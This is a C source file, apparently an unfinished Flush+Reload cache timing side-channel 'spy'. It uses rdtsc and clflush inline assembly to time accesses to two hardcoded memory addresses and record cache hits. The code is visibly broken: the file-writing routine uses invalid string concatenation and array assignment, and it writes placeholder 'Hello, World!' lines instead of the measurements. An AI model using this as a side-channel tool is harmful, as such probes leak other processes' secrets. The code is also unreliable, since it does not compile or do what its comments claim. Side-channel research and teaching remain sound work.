//#include <fcntl.h> // TODO remove unneeded libs
//#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <stdint.h>
#include <stdint.h>

#define THRESHOLD 300

// DaGe f+r implementation
#define busy_wait(cycles) for(volatile long i_ = 0; i_ != cycles; i_++); // importance?

// probe from paper
int probe_treshold(char *adrs)
{
    volatile unsigned long time;

    __asm__ __volatile__ (
        " mfence            \n"
        " lfence            \n"
        " rdtsc             \n"
        " movl %%eax, %%esi \n"
        " movl (%1), %%eax  \n"
        " lfence            \n"
        " rdtsc             \n"
        " subl %%esi, %%eax \n"
        " clflush 0(%1)     \n"
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx");
    return time < THRESHOLD; 
}

int probe_precise(char *adrs)
{
    volatile unsigned long time;

    // where are we using edx?
    // when do we write something into %1?? and output (%0)
    __asm__ __volatile__ (
        " mfence            \n"
        " lfence            \n"
        " rdtsc             \n"
        " movl %%eax, %%esi \n"
        " movl (%1), %%eax  \n"
        " lfence            \n"
        " rdtsc             \n"
        " subl %%esi, %%eax \n"
        " clflush 0(%1)     \n"
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx");
    return time; 
}

// spy process probing certain memory addresses
// https://stackoverflow.com/questions/13772567/how-to-get-the-cpu-cycle-count-in-x86-64-from-c
static __inline__ unsigned long long rdtsc(void)
{
    unsigned long long int x;
    __asm__ __volatile__ ("rdtsc" : "=A" (x));
    return x;
}

// write measurements to file
void writer(char **target_adrs, int adrs_amount, unsigned int **measurements, int probes_amount)
{
    char str_buf[20];
    char time[20];
    char name_buf[50];
    for(int i=0; i<adrs_amount; i++)
    {
        sprintf(time, "%d", rdtsc());
        sprintf(str_buf, "%x", *target_adrs[i]);
        printf("reading %p\n", *target_adrs[i]);
        name_buf = "measurements_"+*str_buf+"_"+*time+".txt";
        FILE *file = fopen(name_buf, "w");
        if (file == NULL) {
            printf("Failed to open the file.\n");
            return; // Exit the program with an error code
        }

        fprintf(file, "Hello, World!\n");
        fprintf(file, "This is a line of text.\n");

        fclose(file);
    }
    
}

/**
 * loop
 * probe addresses and safe results in lists (or define length ("buffer") at beginning and just fill array)
 * wait (how to ensure constant duration of time slots?)
 * if no cache hits for X times or array full finish and create files with timings
 */
void spy(char **target_adrs, int adrs_amount, int probes_amount)
{
    unsigned long long old_tsc, tsc = rdtsc();
    unsigned int measurements[adrs_amount][probes_amount]; // results
    for(int cur_slot=0;cur_slot<probes_amount;cur_slot++)
    {
        // update time stamps
        old_tsc = tsc;
        tsc=rdtsc();
        while (tsc - old_tsc < 2500) // TODO why 2500/500 cycles per slot now, depending on printf
        {
            //printf("waiting %llu cycles\n", (2500-tsc+old_tsc) / 50);
            //busy_wait((2500-tsc+old_tsc) / 50);
            tsc = rdtsc();
        }
        printf("system time counter: %llu, counter diff: %llu\n", tsc, tsc-old_tsc);
        for(int cur_adr_i=0;cur_adr_i<adrs_amount;cur_adr_i++)
        {
            char *ptr=target_adrs[cur_adr_i];
            measurements[cur_adr_i][cur_slot]=probe_precise(ptr); 
            printf("measured value for adrs %p is %i\n", ptr, measurements[cur_adr_i][cur_slot]);                             // probe
                                                                                                        // add timing to array for persistence 
        }
                                                                                                        // wait 2500 cycles in ns current_probe_time asd (how?)
    }
    writer(target_adrs, adrs_amount, measurements, probes_amount);
    printf("end spy\n");
}

// default address values (?)
int main(int argc, char *argv[])
{
    printf("starting\n");
    char *target_adrs[2];
    target_adrs[0]=(char *)0x00000000000967c7;
    target_adrs[1]=(char *)0x0000000000095f5d;
    int adrs_amount = 2, pr_amount = 2000;
    printf("starting spy\n");
    spy(target_adrs, adrs_amount, pr_amount);
    printf("ending\n");    
}

// compile without cygwin1.dll, execute with cygwin1.dll in System32

// TODO status access violation for first time?? lol